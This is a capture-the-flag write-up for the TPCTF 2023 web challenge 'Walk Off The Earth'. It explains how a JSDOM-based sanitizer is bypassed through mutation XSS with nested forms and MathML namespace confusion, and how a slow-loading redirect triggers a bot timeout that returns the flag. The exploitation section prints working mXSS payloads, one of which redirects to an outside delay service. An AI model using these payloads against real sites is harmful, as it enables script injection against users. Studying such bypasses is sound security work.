---
title: Walk Off The Earth - TPCTF 2023
date: 2023-11-30 21:30:16
author: Luc1f3r
author_url: https://twitter.com/Adithyaraj2515
categories:
  - Web
tags:
  - TPCTF
  - Writeup
  - mXSS
---

**tl;dr**

+ Mutation XSS using namespace confusion
+ Parsing inconsistency in JSDOM

<!--more-->

**Challenge Points**: 666
**No. of solves**: 11
**Solved by**: [Luc1f3r](https://twitter.com/Adithyaraj2515),[ma1f0y](https://twitter.com/mal_f0y),[lu513n](https://twitter.com/Lu513n)

## Challenge Description
Wake up, samurai. We have a city to burn!

## Analysis
The challenge has two endpoints.
`/note` :- for create and view a note
`/visit` :- reporting the note

First lets look at the ``/note`` endpoint.
```js
app.get('/note', (req, res) => {
    res.send(sanitize(req.query.text) || 'No note!');
})
...
const sanitize = (html) => {

    let clean = custom_sanitize(html)

    return clean
}

function custom_sanitize(html) {
    const BLOCKED_TAG = /(script|iframe|a|img|svg|audio|video)$/i
    const BLOCKED_ATTR = /(href|src|on.+)/i

    const document = new JSDOM('').window.document
    document.body.innerHTML = html
    let node;
    const iter = document.createNodeIterator(document.body)
    console.log("Before sanitization:- "+document.body.innerHTML)
    while (node = iter.nextNode()) {
        if (node.tagName) {
            console.log("The node is :-"+node.tagName)
            if (BLOCKED_TAG.test(node.tagName)) {
                console.log("The blocked node is :-"+node.tagName)
                node.remove()
                console.log("After eliminating blocked:- "+document.body.innerHTML)
                continue
            }
        }
        
        if (node.attributes) {
            for (let i = node.attributes.length - 1; i >= 0; i--) {
                const att = node.attributes[i]
                if (BLOCKED_ATTR.test(att.name)) {
                    console.log("The blocked attribute is :-"+att.name)
                    node.removeAttributeNode(att)
                }
            }
        }
    }
    console.log("Final payload:- "+document.body.innerHTML)
    return document.body.innerHTML
}

```

Here the note we submitted is passed through a custom sanitizer. This custom sanitizer looks for tags and attributes which can be used for triggering XSS. 

Now let's look at the ``/visit`` endpoint .

```js
app.post('/visit', async (req, res) => {
    const { path, pow } = req.body;
    if (req.session.pow) {
      try {
        const result = await visit(path);
        return res.send(result);
      } catch (e) {
        console.error(e);
        return res.status(500).send('Something wrong');
      }

    } else {
      return res.status(500).send(`Invalid pow!`);
    }
});
```

The visit() function in this endpoint calls the bot and it visits the given url.
```js

async function visit(path) {
    let browser, page;

    if (!/^\/note\?/.test(path)) {
        return 'Invalid path!';
    }
    const url = new URL(BASE_URL + path);
    let res = FLAG;
    try {
        browser = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
            ],
            executablePath: '/usr/bin/chromium-browser',
        });

        page = await browser.newPage();
        await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 2000 });
        try {
            let text = new URL(url).searchParams.get('text');
            text = sanitize(text);
            await page.waitForFunction(text => document.write(text), { timeout: 2000 },text);
            res = "ByeBye!";
        } catch (e) {
            if (e instanceof puppeteer.ProtocolError && e.message.includes('Target closed')) {
                return res;
            }
        } finally {
            res = "ByeBye!";
        }
    } catch (e) {
        try { await browser.close(); } catch (e) { }
        return res;
    }
    try { await browser.close(); } catch (e) { }
    return "ByeBye!";
}
module.exports = visit;
```

## Exploitation
For getting the flag there are two steps.
### 1st Step - XSS through Mutation

First we have to bypass the custom sanitizer to get mutation XSS. The blocked tags and attributes are
```js
const BLOCKED_TAG = /(script|iframe|a|img|svg|audio|video)$/i
const BLOCKED_ATTR = /(href|src|on.+)/i
```

Here the sanitizer uses JSDOM for sanitizing the note.
> JSDOM is a library which parses and interacts with assembled HTML just like a browser. The benefit is that it isn't actually a browser. Instead, it implements web standards like browsers do.
^^[JSDOM](https://www.testim.io/blog/jsdom-a-guide-to-how-to-get-started-and-what-you-can-do/#:~:text=tool%20like%20JSDOM.-,JSDOM,-is%20a%20library)

For the XSS we would have to mutate ordinary HTML tags into dangerous ones.
If you give the following HTML in browser

```html
<form> hello 
    <form> hii
        <img>
```

Then it will parse into DOM as
![Dom1](hello.png)

In the browser, form element cannot be nested in itself. If it is nested as given above it will remove inner form tag from the DOM.
The important part is that, nested form tags are possible in JSDOM.

There is a similar [research](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/#:~:text=wasn%E2%80%99t%20ever%20there.-,Now%20comes,-the%20interesting%20part) on nested forms in DOMpurify.

Using this parsing inconsistency in JSDOM for nested tags, we can exploit the website. This can be done by giving nested forms into the custom sanitizer and it will take that as normal tags but in the browser it will trigger an XSS.

The exploit is
``<form><math><mtext></form><form><mglyph><style></math><script>alert(10)</script>``

Then the sanitizer serializes this into ... 
``<form><math><mtext><form><mglyph><style></math><script>alert(10)</script></style></mglyph></form></mtext></math></form>``

But the browser takes this as
``<form><math><mtext><mglyph><style></style></mglyph></mtext></math><script>alert(10)</script></form>``

And the exploit will parse into the DOM as
![DomView](exp.png)

It is because the form element comes as the direct child of another form, which is not possible, thus the inner form tag is removed from the DOM. Then the ``</math>`` tag closes the tags before it and the script tag comes outside.

So now we have successfully got XSS. But how do we get the flag?
### 2nd Step - Getting the flag
The flag is in the visit() function

```js
async function visit(path) {
    let browser, page;

    if (!/^\/note\?/.test(path)) {
        return 'Invalid path!';
    }
    const url = new URL(BASE_URL + path);
    let res = FLAG;

    try {
        browser = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
            ],
            executablePath: '/usr/bin/chromium-browser',
        });

        page = await browser.newPage();

        await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 2000 });

        try {
            let text = new URL(url).searchParams.get('text');
            text = sanitize(text);
            await page.waitForFunction(text => document.write(text), { timeout: 2000 },text);
            res = "ByeBye!";
        } catch (e) {
            if (e instanceof puppeteer.ProtocolError && e.message.includes('Target closed')) {
                return res;
            }
        } finally {
            res = "ByeBye!";
        }
    } catch (e) {
        try { await browser.close(); } catch (e) { }
        return res;
    }
    try { await browser.close(); } catch (e) { }
    return "ByeBye!";
}

```
Here the flag is only returned from the catch blocks. 
One way to get the flag is using the inner catch block. It catches the exception 'puppeteer.ProtocolError' but there is also a finally block which will alter the response.
The other way is using the outer catch block which catches the exceptions even before entering the next try block. Hence our aim is to somehow enter the outer catch block.

This line,  ``await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 2000 });`` stands out because page.goto() function will wait for the 'domcontent' to be loaded and the maximum time for the domcontent for loading is given as '2000' milli seconds

What happens if it doesn't load the domcontent of the given url in the given time is that it will create an error!!

Using this we can enter the outer catch block. We can just give a url which will take more than 2000 milli seconds to load and combine it with the mXSS and get the flag.

The final exploit will be 
```html
<form><math><mtext></form><form><mglyph><style></math><script>window.location="https://app.requestly.io/delay/4000/<AnyWebsite>"</script>```
